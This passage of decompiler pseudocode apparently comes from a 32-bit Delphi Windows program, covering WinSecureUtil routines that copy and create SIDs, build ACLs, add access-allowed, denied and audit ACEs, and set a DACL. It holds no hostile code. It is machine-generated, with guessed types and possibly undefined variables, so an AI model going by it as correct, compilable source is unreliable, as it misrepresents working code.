              (int)v16,
              a3,
              a4,
              a5);
    __writefsdword(0, v19);
    savedregs = &loc_44ECD0;
    sub_405598(v16);
    __writefsdword(0, v19);
    savedregs = &loc_44ECED;
    sub_405598(v20);
  }
  return v17;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 44E564: using guessed type __int16 cls_WinSecureUtil_TWinSecurityId;
// 44E824: using guessed type int (*cls_WinSecureUtil_TWinSecurityFileACL)();
// 44E988: using guessed type int (__stdcall *cls_WinSecureUtil_TWinSecureFile)(int);
// 44ED00: using guessed type int __fastcall Idcustomhttpserver::TIdHTTPResponseInfo::TIdHTTPResponseInfo(_DWORD, _DWORD, _DWORD);
// 467D8C: using guessed type char byte_467D8C;
// 467D90: using guessed type int dword_467D90;

//----- (0044ED60) --------------------------------------------------------
int sub_44ED60()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  sub_405588();
  result = v3;
  if ( *(_BYTE *)(v3 + 12) )
  {
    result = v3;
    if ( *(_DWORD *)(v3 + 8) != -1 )
    {
      CloseHandle_0(*(HANDLE *)(v3 + 8));
      result = v3;
      *(_DWORD *)(v3 + 8) = -1;
    }
  }
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0044EDC0) --------------------------------------------------------
_DWORD *__fastcall sub_44EDC0(int a1, _DWORD *a2)
{
  _DWORD *result; // eax

  *a2 = 131097;
  a2[1] = 131078;
  a2[2] = 131097;
  result = a2;
  a2[3] = 983103;
  return result;
}

//----- (0044EE00) --------------------------------------------------------
int (**sub_44EE00())()
{
  return &cls_WinSecureUtil_TWinSecurityFileACL;
}
// 44E824: using guessed type int (*cls_WinSecureUtil_TWinSecurityFileACL)();

//----- (0044EE20) --------------------------------------------------------
_DWORD *__fastcall sub_44EE20(int a1, _DWORD *a2, volatile __int32 *a3, _DWORD *a4)
{
  _DWORD *result; // eax

  if ( a3 )
    *a3 = 0;
  *a2 = *(_DWORD *)(a1 + 8);
  sub_406FE8(a3, *(_DWORD *)(a1 + 4));
  result = a4;
  *a4 = 1;
  return result;
}

//----- (0044EE70) --------------------------------------------------------
HGLOBAL sub_44EE70()
{
  return GlobalAlloc(0x40u, 0x44u);
}

//----- (0044EEA0) --------------------------------------------------------
int *__fastcall sub_44EEA0(int a1, char a2, void *a3)
{
  unsigned int v4[2]; // [esp-1Ch] [ebp-2Ch] BYREF
  int *v5; // [esp-14h] [ebp-24h]
  PSID pDestinationSid; // [esp+0h] [ebp-10h] BYREF
  PSID pSourceSid; // [esp+4h] [ebp-Ch]
  char v8; // [esp+Bh] [ebp-5h]
  int *v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  pSourceSid = a3;
  v8 = a2;
  v9 = (int *)a1;
  sub_405568(a1, 0);
  if ( pSourceSid )
  {
    pDestinationSid = sub_44EE70();
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_44EF2F;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    if ( CopySid(0x44u, pDestinationSid, pSourceSid) && IsValidSid(pDestinationSid) )
    {
      v9[1] = (int)pDestinationSid;
      pDestinationSid = 0;
    }
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_44EF36;
    sub_44F0E0(*v9, &pDestinationSid);
  }
  if ( v8 )
    System::__linkproc__ AfterConstruction(v9);
  return v9;
}
// 44EEB2: variable 'a3' is possibly undefined
// 44EEB5: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (0044EF60) --------------------------------------------------------
int *__userpurge sub_44EF60@<eax>(
        int a1@<eax>,
        char a2@<dl>,
        WELL_KNOWN_SID_TYPE a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>,
        PSID DomainSid)
{
  unsigned int v8[2]; // [esp-1Ch] [ebp-30h] BYREF
  int *v9; // [esp-14h] [ebp-28h]
  DWORD cbSid; // [esp+0h] [ebp-14h] BYREF
  PSID pSid; // [esp+4h] [ebp-10h] BYREF
  WELL_KNOWN_SID_TYPE WellKnownSidType; // [esp+8h] [ebp-Ch]
  char v13; // [esp+Fh] [ebp-5h]
  int *v14; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  WellKnownSidType = a3;
  v13 = a2;
  v14 = (int *)a1;
  sub_405568(a1, 0);
  pSid = sub_44EE70();
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_44F010;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  cbSid = 68;
  if ( CreateWellKnownSid(WellKnownSidType, DomainSid, pSid, &cbSid) )
  {
    if ( IsValidSid(pSid) )
    {
      v14[1] = (int)pSid;
      pSid = 0;
    }
  }
  else
  {
    sub_433940(*off_467F18, L"CreateWellKnownSid", (int)L"WinSecure:", a4, a5, a6, 0);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_44F017;
  sub_44F0E0(*v14, &pSid);
  if ( v13 )
    System::__linkproc__ AfterConstruction(v14);
  return v14;
}
// 44EF72: variable 'a3' is possibly undefined
// 44EF75: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 44F044: using guessed type wchar_t aWinsecure[11];
// 44F068: using guessed type wchar_t aCreatewellknow[19];
// 467F18: using guessed type int *off_467F18;

//----- (0044F090) --------------------------------------------------------
int sub_44F090()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  sub_44F0E0(*(_DWORD *)v0, (HGLOBAL *)(v0 + 4));
  result = sub_405588();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0044F0E0) --------------------------------------------------------
HGLOBAL *__fastcall sub_44F0E0(int a1, HGLOBAL *a2)
{
  HGLOBAL *result; // eax

  result = a2;
  if ( *a2 )
  {
    GlobalFree(*a2);
    result = a2;
    *a2 = 0;
  }
  return result;
}

//----- (0044F110) --------------------------------------------------------
DWORD __fastcall sub_44F110(int a1)
{
  int v2; // [esp+0h] [ebp-8h]

  v2 = 0;
  if ( sub_44F140(a1) )
    return GetLengthSid(*(PSID *)(a1 + 4));
  return v2;
}

//----- (0044F140) --------------------------------------------------------
bool __fastcall sub_44F140(int a1)
{
  return *(_DWORD *)(a1 + 4) && IsValidSid(*(PSID *)(a1 + 4));
}

//----- (0044F180) --------------------------------------------------------
int __fastcall sub_44F180(int a1, unsigned __int8 a2, int a3)
{
  int v4; // [esp+4h] [ebp-10h] BYREF
  int v5; // [esp+8h] [ebp-Ch]
  unsigned __int8 v6; // [esp+Fh] [ebp-5h]
  int v7; // [esp+10h] [ebp-4h]

  v5 = a3;
  v6 = a2;
  v7 = a1;
  v4 = 0;
  if ( sub_44F2B0(a1, a2) )
  {
    v4 = unknown_libname_163(v5, v6);
    if ( sub_44F140(*(_DWORD *)(v4 + 16)) )
      sub_427F40(*(_DWORD **)(v7 + 4), v4);
    else
      unknown_libname_94(&v4);
  }
  return v4;
}
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 44F5F0: using guessed type _DWORD __stdcall unknown_libname_163(_DWORD, char);

//----- (0044F1F0) --------------------------------------------------------
int __fastcall sub_44F1F0(int a1, char a2)
{
  char v3; // [esp+3h] [ebp-5h]
  int v4; // [esp+4h] [ebp-4h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v3 = a2;
  v4 = a1;
  *(_DWORD *)(a1 + 4) = sub_405568((int)cls_CrossPlatform_TList, 1);
  *(_BYTE *)(v4 + 8) = 2;
  if ( v3 )
    System::__linkproc__ AfterConstruction(v4);
  return v4;
}
// 44F202: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();

//----- (0044F240) --------------------------------------------------------
int sub_44F240()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  sub_424720((int *)(v0 + 4));
  result = sub_405588();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0044F280) --------------------------------------------------------
HGLOBAL *__fastcall sub_44F280(int a1, HGLOBAL *a2)
{
  HGLOBAL *result; // eax

  result = a2;
  if ( *a2 )
  {
    GlobalFree(*a2);
    result = a2;
    *a2 = 0;
  }
  return result;
}

//----- (0044F2B0) --------------------------------------------------------
int (**__fastcall sub_44F2B0(int a1, unsigned __int8 a2))()
{
  unsigned int v3[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v4; // [esp-4h] [ebp-18h]
  void *v5; // [esp+0h] [ebp-14h] BYREF
  int v6; // [esp+4h] [ebp-10h] BYREF
  int (**v7)(); // [esp+8h] [ebp-Ch]
  unsigned __int8 v8; // [esp+Fh] [ebp-5h]
  int v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v6 = 0;
  v5 = 0;
  v8 = a2;
  v9 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_44F33E;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v7 = 0;
  if ( a2 <= 0x14u )
    v7 = off_467D38[v8];
  if ( !v7 )
  {
    sub_415150(v8, (int *)&v5);
    sub_407968(&v6, L"Unknown ACE type ", v5);
    sub_433460(*off_467F18, v6, (int)L"WinSecure:");
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_44F345;
  sub_406CA4((int)&v5, 2);
  return v7;
}
// 44F358: using guessed type wchar_t aUnknownAceType[18];
// 44F388: using guessed type wchar_t aWinsecure_0[11];
// 467D38: using guessed type int (**off_467D38[3])();
// 467F18: using guessed type int *off_467F18;

//----- (0044F3A0) --------------------------------------------------------
int __fastcall sub_44F3A0(int a1)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8);
}

//----- (0044F3C0) --------------------------------------------------------
int __fastcall sub_44F3C0(int a1, unsigned int a2)
{
  return sub_428060(*(Idthreadcomponent::TIdThreadComponent **)(a1 + 4), a2);
}

//----- (0044F3F0) --------------------------------------------------------
PACL __usercall sub_44F3F0@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>, long double a4@<st0>)
{
  int v4; // eax
  int v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v8; // [esp-8h] [ebp-24h]
  int *v9; // [esp-4h] [ebp-20h]
  int v10; // [esp+0h] [ebp-1Ch]
  SIZE_T dwBytes; // [esp+4h] [ebp-18h]
  int v12; // [esp+8h] [ebp-14h]
  int v13; // [esp+Ch] [ebp-10h]
  PACL v14; // [esp+10h] [ebp-Ch]
  int v15; // [esp+14h] [ebp-8h]
  PACL pAcl; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v15 = a1;
  v14 = 0;
  dwBytes = 8;
  v4 = sub_44F3A0(a1) - 1;
  if ( v4 < 0 )
  {
LABEL_7:
    dwBytes = (dwBytes + 3) & 0xFFFFFFFC;
    pAcl = (PACL)GlobalAlloc(0x40u, dwBytes);
    if ( pAcl )
    {
      v9 = &savedregs;
      v8 = &loc_44F55C;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      if ( InitializeAcl(pAcl, dwBytes, *(unsigned __int8 *)(v15 + 8)) )
      {
        v5 = sub_44F3A0(v15) - 1;
        if ( v5 < 0 )
        {
LABEL_15:
          v14 = pAcl;
          pAcl = 0;
          __writefsdword(0, (unsigned int)ExceptionList);
          v9 = (int *)&loc_44F563;
          GlobalFree(0);
        }
        else
        {
          v10 = v5 + 1;
          v13 = 0;
          while ( 1 )
          {
            v12 = sub_44F3C0(v15, v13);
            if ( !(*(unsigned __int8 (__fastcall **)(int, PACL))(*(_DWORD *)v12 + 8))(v12, pAcl) )
              break;
            ++v13;
            if ( !--v10 )
              goto LABEL_15;
          }
          sub_433460(*off_467F18, (int)L"Unable to save ACL", (int)L"WinSecure:");
          System::__linkproc__ TryFinallyExit(ExceptionList, v8, v9);
        }
      }
      else
      {
        sub_433940(*off_467F18, L"InitializeAcl", (int)L"WinSecure:", a2, a3, a4, 0);
        System::__linkproc__ TryFinallyExit(ExceptionList, v8, v9);
      }
    }
  }
  else
  {
    v13 = v4;
    while ( 1 )
    {
      v12 = sub_44F3C0(v15, v13);
      if ( !sub_44F140(*(_DWORD *)(v12 + 16)) )
        break;
      if ( *(_BYTE *)(v12 + 10) > *(_BYTE *)(v15 + 8) )
        *(_BYTE *)(v15 + 8) = *(_BYTE *)(v12 + 10);
      dwBytes += sub_44F110(*(_DWORD *)(v12 + 16));
      dwBytes += (*(int (__fastcall **)(int))(*(_DWORD *)v12 + 4))(v12);
      if ( --v13 == -1 )
        goto LABEL_7;
    }
  }
  return v14;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 44F578: using guessed type wchar_t aWinsecure_1[11];
// 44F59C: using guessed type wchar_t aInitializeacl[14];
// 44F5C4: using guessed type wchar_t aUnableToSaveAc[19];
// 467F18: using guessed type int *off_467F18;

//----- (0044F670) --------------------------------------------------------
int sub_44F670()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  unknown_libname_94(v0 + 16);
  result = sub_405588();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (0044F6B0) --------------------------------------------------------
int sub_44F6B0()
{
  return 8;
}

//----- (0044F6D0) --------------------------------------------------------
int *__fastcall sub_44F6D0(int a1, int a2)
{
  int *result; // eax

  result = sub_44EEA0((int)&cls_WinSecureUtil_TWinSecurityId, 1, (void *)(a2 + 8));
  *(_DWORD *)(a1 + 16) = result;
  return result;
}
// 44E564: using guessed type __int16 cls_WinSecureUtil_TWinSecurityId;

//----- (0044F700) --------------------------------------------------------
bool __usercall sub_44F700@<al>(int a1@<eax>, ACL *a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>)
{
  BOOL v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-38h] BYREF
  int (__cdecl *v8)(int, int); // [esp-14h] [ebp-34h]
  int *v9; // [esp-10h] [ebp-30h]
  unsigned int v10[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v11; // [esp-4h] [ebp-24h]
  void *v12; // [esp+0h] [ebp-20h] BYREF
  int v13; // [esp+4h] [ebp-1Ch] BYREF
  SIZE_T dwBytes; // [esp+8h] [ebp-18h]
  DWORD nDestinationSidLength; // [esp+Ch] [ebp-14h]
  bool v16; // [esp+13h] [ebp-Dh]
  PACL pAcl; // [esp+14h] [ebp-Ch]
  int v18; // [esp+18h] [ebp-8h]
  LPVOID pAceList; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v13 = 0;
  v12 = 0;
  pAcl = a2;
  v18 = a1;
  v11 = &savedregs;
  v10[1] = (unsigned int)System::__linkproc__ HandleFinally;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v16 = 0;
  switch ( *(_BYTE *)(a1 + 8) )
  {
    case 0:
      v16 = AddAccessAllowedAceEx(
              pAcl,
              *(unsigned __int8 *)(v18 + 10),
              *(unsigned __int8 *)(v18 + 9),
              *(_DWORD *)(v18 + 12),
              *(PSID *)(*(_DWORD *)(v18 + 16) + 4));
      goto LABEL_11;
    case 1:
      v16 = AddAccessDeniedAceEx(
              pAcl,
              *(unsigned __int8 *)(v18 + 10),
              *(unsigned __int8 *)(v18 + 9),
              *(_DWORD *)(v18 + 12),
              *(PSID *)(*(_DWORD *)(v18 + 16) + 4));
      goto LABEL_11;
    case 2:
      v16 = AddAuditAccessAceEx(
              pAcl,
              *(unsigned __int8 *)(v18 + 10),
              *(unsigned __int8 *)(v18 + 9),
              *(_DWORD *)(v18 + 12),
              *(PSID *)(*(_DWORD *)(v18 + 16) + 4),
              -((*(_BYTE *)(v18 + 9) & 0x40) != 0),
              -(*(char *)(v18 + 9) < 0));
      goto LABEL_11;
    case 9:
    case 0xA:
    case 0xD:
      dwBytes = (*(int (__fastcall **)(int))(*(_DWORD *)v18 + 4))(v18);
      nDestinationSidLength = sub_44F110(*(_DWORD *)(v18 + 16));
      dwBytes += nDestinationSidLength;
      pAceList = GlobalAlloc(0x40u, dwBytes);
      if ( !pAceList )
        goto LABEL_13;
      v9 = &savedregs;
      v8 = System::__linkproc__ HandleFinally;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      *(_BYTE *)pAceList = *(_BYTE *)(v18 + 8);
      *((_BYTE *)pAceList + 1) = *(_BYTE *)(v18 + 9);
      *((_WORD *)pAceList + 1) = dwBytes;
      *((_DWORD *)pAceList + 1) = *(_DWORD *)(v18 + 12);
      if ( CopySid(nDestinationSidLength, (char *)pAceList + 44, *(PSID *)(*(_DWORD *)(v18 + 16) + 4)) )
      {
        v5 = AddAce(pAcl, *(unsigned __int8 *)(v18 + 10), 0xFFFFFFFF, pAceList, dwBytes);
        v16 = v5;
        if ( !v5 )
          sub_433940(*off_467F18, L"AddAce", (int)L"WinSecure:", a3, a4, a5, 0);
        __writefsdword(0, (unsigned int)ExceptionList);
        v9 = (int *)&loc_44F946;
        GlobalFree(pAceList);
LABEL_11:
        if ( !v16 )
        {
          v9 = 0;
          sub_415150(*(unsigned __int8 *)(v18 + 8), (int *)&v12);
          sub_407968(&v13, L"Unable to Add ACL ", v12);
          sub_433940(*off_467F18, (void *)v13, (int)L"WinSecure:", a3, a4, a5, (char)v9);
        }
      }
      else
      {
        sub_433940(*off_467F18, L"CopySid", (int)L"WinSecure:", a3, a4, a5, 0);
        System::__linkproc__ TryFinallyExit(ExceptionList, v8, v9);
      }
LABEL_13:
      __writefsdword(0, v10[0]);
      v11 = (int *)&loc_44F9A3;
      sub_406CA4((int)&v12, 2);
      return v16;
    default:
      goto LABEL_13;
  }
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 44F93F: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 44F99C: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 44F9B8: using guessed type wchar_t aWinsecure_2[11];
// 44F9DC: using guessed type wchar_t aCopysid[8];
// 44F9F8: using guessed type wchar_t aAddace[7];
// 44FA14: using guessed type wchar_t aUnableToAddAcl[19];
// 467F18: using guessed type int *off_467F18;

//----- (0044FA40) --------------------------------------------------------
int sub_44FA40()
{
  return 44;
}

//----- (0044FA60) --------------------------------------------------------
int __fastcall sub_44FA60(_DWORD *a1, _DWORD *a2)
{
  int result; // eax

  a1[4] = sub_44EEA0((int)&cls_WinSecureUtil_TWinSecurityId, 1, a2 + 11);
  a1[5] = a2[3];
  a1[6] = a2[4];
  a1[7] = a2[5];
  a1[8] = a2[6];
  a1[9] = a2[7];
  a1[10] = a2[8];
  a1[11] = a2[9];
  a1[12] = a2[10];
  result = a2[2];
  a1[13] = result;
  return result;
}
// 44E564: using guessed type __int16 cls_WinSecureUtil_TWinSecurityId;

//----- (0044FAC0) --------------------------------------------------------
bool __usercall sub_44FAC0@<al>(int a1@<eax>, ACL *a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>)
{
  BOOL v5; // eax
  BOOL v6; // eax
  BOOL v7; // eax
  _DWORD *v8; // esi
  _DWORD *v9; // edi
  _DWORD *v10; // esi
  _DWORD *v11; // edi
  int v12; // edi
  int v13; // esi
  BOOL v14; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  int (__cdecl *v17)(int, int); // [esp-8h] [ebp-28h]
  int *v18; // [esp-4h] [ebp-24h]
  SIZE_T dwBytes; // [esp+8h] [ebp-18h]
  DWORD nDestinationSidLength; // [esp+Ch] [ebp-14h]
  bool v21; // [esp+13h] [ebp-Dh]
  PACL pAcl; // [esp+14h] [ebp-Ch]
  int v23; // [esp+18h] [ebp-8h]
  LPVOID pAceList; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  pAcl = a2;
  v23 = a1;
  v21 = 0;
  switch ( *(_BYTE *)(a1 + 8) )
  {
    case 5:
      v5 = AddAccessAllowedObjectAce(
             pAcl,
             *(unsigned __int8 *)(v23 + 10),
             *(unsigned __int8 *)(v23 + 9),
             *(_DWORD *)(v23 + 12),
             (GUID *)(v23 + 20),
             (GUID *)(v23 + 36),
             *(PSID *)(*(_DWORD *)(v23 + 16) + 4));
      v21 = v5;
      if ( !v5 )
        sub_433940(*off_467F18, L"AddAccessAllowedObjectAce", (int)L"WinSecure:", a3, a4, a5, 0);
      break;
    case 6:
      v6 = AddAccessDeniedObjectAce(
             pAcl,
             *(unsigned __int8 *)(v23 + 10),
             *(unsigned __int8 *)(v23 + 9),
             *(_DWORD *)(v23 + 12),
             (GUID *)(v23 + 20),
             (GUID *)(v23 + 36),
             *(PSID *)(*(_DWORD *)(v23 + 16) + 4));
      v21 = v6;
      if ( !v6 )
        sub_433940(*off_467F18, L"AddAccessDeniedObjectAce", (int)L"WinSecure:", a3, a4, a5, 0);
      break;
    case 7:
      v7 = AddAuditAccessObjectAce(
             pAcl,
             *(unsigned __int8 *)(v23 + 10),
             *(unsigned __int8 *)(v23 + 9),
             *(_DWORD *)(v23 + 12),
             (GUID *)(v23 + 20),
             (GUID *)(v23 + 36),
             *(PSID *)(*(_DWORD *)(v23 + 16) + 4),
             -((*(_BYTE *)(v23 + 9) & 0x40) != 0),
             -(*(char *)(v23 + 9) < 0));
      v21 = v7;
      if ( !v7 )
        sub_433940(*off_467F18, L"AddAuditAccessObjectAce", (int)L"WinSecure:", a3, a4, a5, 0);
      break;
    case 0xB:
    case 0xC:
    case 0xF:
      dwBytes = (*(int (__fastcall **)(int))(*(_DWORD *)v23 + 4))(v23);
      nDestinationSidLength = sub_44F110(*(_DWORD *)(v23 + 16));
      dwBytes += nDestinationSidLength;
      pAceList = GlobalAlloc(0x40u, dwBytes);
      if ( pAceList )
      {
        v18 = &savedregs;
        v17 = System::__linkproc__ HandleFinally;
        ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&ExceptionList);
        *(_BYTE *)pAceList = *(_BYTE *)(v23 + 8);
        *((_BYTE *)pAceList + 1) = *(_BYTE *)(v23 + 9);
        *((_WORD *)pAceList + 1) = dwBytes;
        *((_DWORD *)pAceList + 1) = *(_DWORD *)(v23 + 12);
        *((_DWORD *)pAceList + 2) = *(_DWORD *)(v23 + 52);
        v8 = (_DWORD *)(v23 + 20);
        v9 = (char *)pAceList + 12;
        *((_DWORD *)pAceList + 3) = *(_DWORD *)(v23 + 20);
        *++v9 = *++v8;
        *++v9 = *++v8;
        v9[1] = v8[1];
        v10 = (_DWORD *)(v23 + 36);
        v11 = (char *)pAceList + 28;
        *((_DWORD *)pAceList + 7) = *(_DWORD *)(v23 + 36);
        *++v11 = *++v10;
        *++v11 = *++v10;
        *++v11 = *++v10;
        v13 = (int)(v10 + 1);
        v12 = (int)(v11 + 1);
        if ( CopySid(nDestinationSidLength, (char *)pAceList + 44, *(PSID *)(*(_DWORD *)(v23 + 16) + 4)) )
        {
          v14 = AddAce(pAcl, *(unsigned __int8 *)(v23 + 10), 0xFFFFFFFF, pAceList, dwBytes);
          v21 = v14;
          if ( !v14 )
            sub_433940(*off_467F18, L"AddAce", (int)L"WinSecure:", v12, v13, a5, 0);
          __writefsdword(0, (unsigned int)ExceptionList);
          v18 = (int *)&def_44FAEB;
          GlobalFree(pAceList);
        }
        else
        {
          sub_433940(*off_467F18, L"CopySid", (int)L"WinSecure:", v12, v13, a5, 0);
          System::__linkproc__ TryFinallyExit(ExceptionList, v17, v18);
        }
      }
      break;
    default:
      return v21;
  }
  return v21;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 44FD9C: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 44FDB8: using guessed type wchar_t aWinsecure_3[11];
// 44FDDC: using guessed type wchar_t aAddaccessallow[26];
// 44FE1C: using guessed type wchar_t aAddaccessdenie[25];
// 44FE5C: using guessed type wchar_t aAddauditaccess[24];
// 44FE98: using guessed type wchar_t aCopysid_0[8];
// 44FEB4: using guessed type wchar_t aAddace_0[7];
// 467F18: using guessed type int *off_467F18;

//----- (0044FED0) --------------------------------------------------------
char __usercall sub_44FED0@<al>(
        void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *)@<eax>,
        int a2@<edx>,
        int a3@<edi>,
        int a4@<esi>,
        long double a5@<st0>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v7; // [esp-8h] [ebp-18h]
  int *v8; // [esp-4h] [ebp-14h]
  PACL pDacl; // [esp+0h] [ebp-10h] BYREF
  char v10; // [esp+7h] [ebp-9h]
  int v11; // [esp+8h] [ebp-8h]
  void (__fastcall ***v12)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *); // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11 = a2;
  v12 = a1;
  v10 = 0;
  pDacl = sub_44F3F0(a2, a3, a4, a5);
  if ( pDacl )
  {
    v8 = &savedregs;
    v7 = &loc_44FF3E;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( sub_44FFD0(v12, 0x20000004u, 0, 0, pDacl, 0) )
    {
      v10 = 1;
      __writefsdword(0, (unsigned int)ExceptionList);
      v8 = (int *)&loc_44FF45;
      sub_44F280(v11, (HGLOBAL *)&pDacl);
    }
    else
    {
      System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
    }
  }
  return v10;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (0044FF50) --------------------------------------------------------
char __usercall sub_44FF50@<al>(
        void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *)@<eax>,
        int a2@<edx>,
        int a3@<edi>,
        int a4@<esi>,
        long double a5@<st0>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v7; // [esp-8h] [ebp-18h]
  int *v8; // [esp-4h] [ebp-14h]
  PACL pDacl; // [esp+0h] [ebp-10h] BYREF
  char v10; // [esp+7h] [ebp-9h]
  int v11; // [esp+8h] [ebp-8h]
  void (__fastcall ***v12)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *); // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11 = a2;
  v12 = a1;
  v10 = 0;
  pDacl = sub_44F3F0(a2, a3, a4, a5);
  if ( pDacl )
  {
    v8 = &savedregs;
    v7 = &loc_44FFBE;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( sub_44FFD0(v12, 0x80000004, 0, 0, pDacl, 0) )
    {
      v10 = 1;
      __writefsdword(0, (unsigned int)ExceptionList);
      v8 = (int *)&loc_44FFC5;
      sub_44F280(v11, (HGLOBAL *)&pDacl);
    }
    else
    {
      System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
    }
  }
  return v10;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (0044FFD0) --------------------------------------------------------
char __fastcall sub_44FFD0(
        void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *),
        SECURITY_INFORMATION a2,
        void *a3,
        PSID psidGroup,
        PACL pDacl,
        PACL pSacl)
{
  _DWORD *v6; // eax
  int v7; // ecx
  WCHAR *v8; // eax
  SE_OBJECT_TYPE v10; // [esp-20h] [ebp-4Ch]
